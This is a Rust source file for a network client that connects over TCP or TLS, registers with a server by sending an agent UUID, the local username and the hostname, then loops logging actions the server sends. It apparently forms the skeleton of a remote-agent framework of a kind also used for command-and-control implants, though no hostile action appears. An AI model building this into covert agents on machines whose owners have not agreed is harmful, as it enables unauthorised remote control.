use crate::client::net::types::r#in::payloads::InPayloadType;
use crate::client::net::types::out::payloads::{OutActionPayload, OutPayloadType};
use crate::client::net::wtp::WtpClient;
use crate::config::UUID;
use anyhow::Result;
use std::collections::HashMap;
use tokio::io::{AsyncRead, AsyncWrite};
use tokio::net::TcpStream;
use tokio_rustls::client::TlsStream;
use tracing::{debug, error, info};
use whoami::fallible::{hostname, username};

use super::net::tls::tls_stream;

pub(crate) struct CoreClient<R>
where
    R: AsyncRead + AsyncWrite + Unpin,
{
    wtp_client: WtpClient<R>,
}

impl CoreClient<TcpStream> {
    pub async fn new(ip: &str) -> Result<Self> {
        Ok(CoreClient {
            wtp_client: WtpClient::new(TcpStream::connect(ip).await?),
        })
    }
}
impl CoreClient<TlsStream<TcpStream>> {
    pub async fn new_tls(ip: &str) -> Result<Self> {
        Ok(CoreClient {
            wtp_client: WtpClient::new(tls_stream(ip).await?),
        })
    }
}
impl<R> CoreClient<R>
where
    R: AsyncRead + AsyncWrite + Unpin,
{
    pub async fn register(&mut self) -> Result<()> {
        let resp = self
            .wtp_client
            .send_packet(OutPayloadType::Action(OutActionPayload {
                name: "core-init".to_string(),
                parameters: HashMap::from([
                    ("uuid".to_string(), UUID.to_string()),
                    (
                        "user".to_string(),
                        username().unwrap_or("UNKNOWN".to_string()),
                    ),
                    (
                        "hostname".to_string(),
                        hostname().unwrap_or("UNKNOWN".to_string()),
                    ),
                ]),
            }))
            .await?;
        match resp {
            InPayloadType::Action(action) => {
                if action.error == "OK" {
                    info!("Client registered successfully");
                } else {
                    error!("Client could not register successfully: {}", action.message);
                }
            }
            InPayloadType::Message(_) => {
                error!("Client received unexpected message");
            }
        }
        Ok(())
    }

    pub async fn handle(&mut self) -> Result<()> {
        loop {
            match self.wtp_client.read_packet().await? {
                InPayloadType::Action(action) => {
                    debug!("Client received action: {}", action.name);
                }
                InPayloadType::Message(message) => {
                    debug!("Client received message: {}", message.message);
                }
            }
        }
    }
}
